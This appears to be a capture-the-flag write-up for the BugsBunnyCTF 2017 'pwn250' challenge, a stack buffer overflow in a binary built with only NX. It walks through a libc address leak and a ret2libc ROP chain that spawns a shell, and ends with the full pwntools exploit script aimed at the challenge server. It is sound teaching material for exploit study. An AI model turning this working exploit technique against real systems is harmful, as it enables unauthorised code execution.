This was a pretty standard, stack-based overflow. You can download the file [here](https://github.com/jbzteam/CTF/raw/master/BugsBunnyCTF2017/pwn250/pwn250).

Through `file` and `checksec` we see that it's a 64-bit ELF non-stripped binary, dynamically linked, compiled with only the `NX` mitigation:
```bash
$ file ./pwn250 
./pwn250: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b92b9ef9aa21452b83be93778ed175c6c37de92d, not stripped
$ checksec ./pwn250 
[*] './pwn250'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

If we open the binary with IDA, we see from the pseudocode that it's a quite simple binary:
```c
int main(int argc, const char **argv, const char **envp)
{
  here();
  write(1, "Hello, World\n", 13);
  return 0;
}
ssize_t here()
{
  char buf[128];

  return read(0, buf, 256);
}
```

The vulnerability is clear: there is a `read` call that reads 256 bytes from standard input and writes them in a variable that can contains 128 bytes.

There is NX so we cannot inject and execute shellcode directly. Our strategy then is to create a small ROP chain to call `system` and execute a shell.

First we need to gather the address of `system` from `libc`, and find an address that points to `/bin/sh`. Since the binary is not PIE, we can use one of the functions imported from libc to leak their address. Our target is `read`.

In order to do this we can use the `write` to print the address of `read`. The organizers were kind enough to leave a function called `foryou` with a great gadget:
```asm
.text:0000000000400566 foryou          proc near
.text:0000000000400566                 push    rbp
.text:0000000000400567                 mov     rbp, rsp
.text:000000000040056A                 pop     rdi
.text:000000000040056B                 pop     rsi
.text:000000000040056C                 pop     rdx
.text:000000000040056D                 retn
```

We can use this gadget to prepare the registers before the call to `write`. Our payload/ROP chain to leak the address of `read` looks like this:
```python
payload = ""
payload += "A" * 128
payload += p64(0xcafebabe) # RBP
payload += p64(0x400567) # mov rbp, rsp; pop rdi; pop rsi; pop rdx; ret;
payload += p64(0x1) # rdi
payload += p64(0x601020) # rsi - address of read
payload += p64(0x10) # rdx - number of bytes to write
payload += p64(0x400430) # address of write
payload += p64(0x4005A6) # jump back to here
```

One thing to keep in mind: we include the `mov rbp, rsp` in the ROP chain because if `rbp` contains an invalid address, the subsequent `leave` would fail and the program would crash. With the `mov` we make sure that `rbp` points to a valid address.

After using the gadget to populate the registers, we call `write` and when it returns we go back to the function `here` where we can send our second payload to get the shell.

Once we get the address of `read`, we can calculate the base address for `libc` (which was provided), and consequently the address of `system` and of the string `/bin/sh` in the binary.

Our second payload looks like this:
```python
payload = ""
payload += "A"*128
payload += p64(0xcafebabe) # RBP
payload += p64(0x400633) # pop rdi; ret; 
payload += p64(sh_address) # rdi
payload += p64(system_address)

```

This second payload first pops the address of `/bin/sh` into `rdi` and then executes `system`.

The full exploit code is below. Sorry guys, I forgot to save the flag :P
```python
from pwn import *

local = 0
if local:
    p = process("./pwn250")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    p = remote("54.153.19.139", 5255)
    libc = ELF("./libc.so")

payload = ""
payload += "A"*128
payload += p64(0xcafebabe) # RBP
payload += p64(0x400567) # mov rbp, rsp; pop rdi; pop rsi; pop rdx; ret;
payload += p64(0x1) # rdi - standard output
payload += p64(0x601020) # rsi - address of read
payload += p64(0x10) # rdx - number of bytes to write
payload += p64(0x400430) # address of write
payload += p64(0x4005A6) # jump back to here
p.sendline(payload)

leak_addr = u64(p.recv(8))
libc_base_addr = leak_addr - libc.symbols['read']
system_address = libc_base_addr + libc.symbols['system']
sh_address = libc_base_addr + next(libc.search("/bin/sh\x00"))
log.info("libc_base_addr @ {:08x}".format(libc_base_addr))

payload = ""
payload += "A"*128
payload += p64(0xcafebabe) # RBP
payload += p64(0x400633) # pop rdi; ret; 
payload += p64(sh_address) # rdi
payload += p64(system_address)
p.sendline(payload)

p.sendline("uname -a && id")
p.interactive()

```
